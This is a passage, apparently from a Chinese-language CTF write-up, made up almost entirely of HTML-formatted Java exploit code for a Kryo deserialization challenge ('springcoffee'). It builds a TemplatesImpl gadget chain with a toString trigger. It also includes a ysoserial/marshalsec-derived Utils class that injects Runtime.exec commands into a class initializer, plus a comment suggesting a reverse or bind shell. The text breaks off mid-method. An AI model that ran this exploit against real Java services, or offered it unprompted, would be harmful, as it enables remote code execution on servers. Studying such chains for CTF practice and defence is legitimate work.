class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.Kryo;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Input;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Output;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.util.DefaultInstantiatorStrategy;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"><span class="keyword">import</span> fun.mrctf.springcoffee.model.ExtraFlavor;</span><br><span class="line"><span class="keyword">import</span> fun.mrctf.springcoffee.model.Mocha;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.json.JSONObject;</span><br><span class="line"><span class="keyword">import</span> org.objenesis.strategy.SerializingInstantiatorStrategy;</span><br><span class="line"><span class="keyword">import</span> org.objenesis.strategy.StdInstantiatorStrategy;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.sql.rowset.BaseRowSet;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Testt</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> Kryo kryo = <span class="keyword">new</span> Kryo();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">ser</span><span class="params">(String raw)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        JSONObject serializeConfig = <span class="keyword">new</span> JSONObject(raw);</span><br><span class="line">        <span class="keyword">if</span> (serializeConfig.has(<span class="string">&quot;polish&quot;</span>) &amp;&amp; serializeConfig.getBoolean(<span class="string">&quot;polish&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">this</span>.kryo = <span class="keyword">new</span> Kryo();</span><br><span class="line">            Method[] var3 = <span class="keyword">this</span>.kryo.getClass().getDeclaredMethods();</span><br><span class="line">            <span class="keyword">int</span> var4 = var3.length;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> var5 = <span class="number">0</span>; var5 &lt; var4; ++var5) &#123;</span><br><span class="line">                Method setMethod = var3[var5];</span><br><span class="line">                <span class="keyword">if</span> (setMethod.getName().startsWith(<span class="string">&quot;set&quot;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        Object p1 = serializeConfig.get(setMethod.getName().substring(<span class="number">3</span>));</span><br><span class="line">                        <span class="keyword">if</span> (!setMethod.getParameterTypes()[<span class="number">0</span>].isPrimitive()) &#123;</span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                p1 = Class.forName((String)p1).newInstance();</span><br><span class="line">                                setMethod.invoke(<span class="keyword">this</span>.kryo, p1);</span><br><span class="line">                            &#125; <span class="keyword">catch</span> (Exception var9) &#123;</span><br><span class="line">                                var9.printStackTrace();</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            setMethod.invoke(<span class="keyword">this</span>.kryo, p1);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception var10) &#123;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        Output output = <span class="keyword">new</span> Output(bos);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; objectObjectHashMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        <span class="keyword">byte</span>[][] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;ClassPool.getDefault().get(<span class="string">&quot;demo.YYDS&quot;</span>).toBytecode()&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        EqualsBean bean = <span class="keyword">new</span> EqualsBean(String.class,<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bytes);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        setFieldValue(bean,<span class="string">&quot;beanClass&quot;</span>, Templates.class);</span><br><span class="line">        setFieldValue(bean,<span class="string">&quot;obj&quot;</span>,templates);</span><br><span class="line">        Object gadgetChain = Utils.makeXStringToStringTrigger(templates,bean); <span class="comment">// toString() trigger</span></span><br><span class="line"></span><br><span class="line">        objectObjectHashMap.put(gadgetChain,<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        kryo.writeClassAndObject(output, objectObjectHashMap);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        output.flush();</span><br><span class="line">        output.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> String(Base64.getEncoder().encode(bos.toByteArray()));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">deser</span><span class="params">(String raw)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        ByteArrayInputStream bas = <span class="keyword">new</span> ByteArrayInputStream(Base64.getDecoder().decode(raw));</span><br><span class="line">        Input input = <span class="keyword">new</span> Input(bas);</span><br><span class="line">        ExtraFlavor flavor = (ExtraFlavor)<span class="keyword">this</span>.kryo.readClassAndObject(input);</span><br><span class="line">        System.out.println(flavor.getName());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        Testt test = <span class="keyword">new</span> Testt();</span><br><span class="line"></span><br><span class="line">        String ser = test.ser(<span class="string">&quot;&#123;\&quot;polish\&quot;:true,\&quot;RegistrationRequired\&quot;:false,\&quot;InstantiatorStrategy\&quot;: \&quot;org.objenesis.strategy.StdInstantiatorStrategy\&quot;&#125;&quot;</span>);</span><br><span class="line">        test.deser(ser);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以及Utils类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;</span><br><span class="line"><span class="keyword">import</span> sun.reflect.ReflectionFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Utility class - based on code found in ysoserial, includes method calls used in</span></span><br><span class="line"><span class="comment"> * ysoserial.payloads.util specifically the Reflections, Gadgets, and ClassFiles classes. These were</span></span><br><span class="line"><span class="comment"> * consolidated into a single util class for the sake of brevity; they are otherwise unchanged.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Additionally, uses code based on marshalsec.gadgets.ToStringUtil.makeSpringAOPToStringTrigger</span></span><br><span class="line"><span class="comment"> * to create a toString trigger</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * ysoserial by Chris Frohoff - https://github.com/frohoff/ysoserial</span></span><br><span class="line"><span class="comment"> * marshalsec by Moritz Bechler - https://github.com/mbechler/marshalsec</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Utils</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="comment">// special case for using TemplatesImpl gadgets with a SecurityManager enabled</span></span><br><span class="line">        System.setProperty(DESERIALIZE_TRANSLET, <span class="string">&quot;true&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// for RMI remote loading</span></span><br><span class="line">        System.setProperty(<span class="string">&quot;java.rmi.server.useCodebaseOnly&quot;</span>, <span class="string">&quot;false&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String ANN_INV_HANDLER_CLASS = <span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">StubTransletPayload</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">5971610431559700674L</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span> <span class="params">(DOM document, SerializationHandler[] handlers )</span> <span class="keyword">throws</span> TransletException </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span> <span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler )</span> <span class="keyword">throws</span> TransletException </span>&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// required to make TemplatesImpl happy</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Foo</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">8207363842866235160L</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> InvocationHandler <span class="title">createMemoizedInvocationHandler</span> <span class="params">(<span class="keyword">final</span> Map&lt;String, Object&gt; map )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (InvocationHandler) Utils.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">createTemplatesImpl</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ( Boolean.parseBoolean(System.getProperty(<span class="string">&quot;properXalan&quot;</span>, <span class="string">&quot;false&quot;</span>)) ) &#123;</span><br><span class="line">            <span class="keyword">return</span> createTemplatesImpl(</span><br><span class="line">                    command,</span><br><span class="line">                    Class.forName(<span class="string">&quot;org.apache.xalan.xsltc.trax.TemplatesImpl&quot;</span>),</span><br><span class="line">                    Class.forName(<span class="string">&quot;org.apache.xalan.xsltc.runtime.AbstractTranslet&quot;</span>),</span><br><span class="line">                    Class.forName(<span class="string">&quot;org.apache.xalan.xsltc.trax.TransformerFactoryImpl&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">T <span class="title">createTemplatesImpl</span> <span class="params">( <span class="keyword">final</span> String command, Class&lt;T&gt; tplClass, Class&lt;?&gt; abstTranslet, Class&lt;?&gt; transFactory )</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> T templates = tplClass.newInstance();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// use template gadget class</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(Utils.StubTransletPayload.class));</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(abstTranslet));</span><br><span class="line">        <span class="keyword">final</span> CtClass clazz = pool.get(Utils.StubTransletPayload.class.getName());</span><br><span class="line">        <span class="comment">// run command in static initializer</span></span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections</span></span><br><span class="line">        String cmd = <span class="string">&quot;System.out.println(\&quot;whoops!\&quot;); java.lang.Runtime.getRuntime().exec(\&quot;&quot;</span> +</span><br><span class="line">                command.replaceAll(<span class="string">&quot;\\\\&quot;</span>,<span class="string">&quot;\\\\\\\\&quot;</span>).replaceAll(<span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;\\\&quot;&quot;</span>) +</span><br><span class="line">                <span class="string">&quot;\&quot;);&quot;</span>;</span><br><span class="line">        clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">        <span class="comment">// sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)</span></span><br><span class="line">        clazz.setName(<span class="string">&quot;ysoserial.Pwner&quot;</span> + System.nanoTime());</span><br><span class="line">        CtClass superC = pool.get(abstTranslet.getName());</span><br><span class="line">        clazz.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// inject class bytes into instance</span></span><br><span class="line">        Utils.setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;</span><br><span class="line">                classBytes, Utils.classAsBytes(Utils.Foo.class)</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// required to make TemplatesImpl happy</span></span><br><span class="line">        Utils.setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Pwnr&quot;</span>);</span><br><span class="line">        Utils.setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, transFactory.newInstance());</span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> </span>&#123;</span><br><span class="line">        Field field = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="keyword">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> Field field = getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> Field field = getField(obj.getClass(), fieldName);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Constructor&lt;?&gt; getFirstCtor(<span class="keyword">final</span> String name) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> Constructor&lt;?&gt; ctor = Class.forName(name).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">return</span> ctor;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@SuppressWarnings</span> ( &#123;<span class="string">&quot;unchecked&quot;</span>&#125; )</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">T <span class="title">createWithConstructor</span> <span class="params">( Class&lt;T&gt; classToInstantiate, Class&lt;? <span class="keyword">super</span> T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes, Object[] consArgs )</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException </span>&#123;</span><br><span class="line">        Constructor&lt;? <span class="keyword">super</span> T&gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes);</span><br><span class="line">        objCons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);</span><br><span class="line">        sc.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (T)sc.newInstance(consArgs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">classAsFile</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> classAsFile(clazz, <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">classAsFile</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">boolean</span> suffix)</span> </span>&#123;</span><br><span class="line">        String str;</span><br><span class="line">        <span class="keyword">if</span> (clazz.getEnclosingClass() == 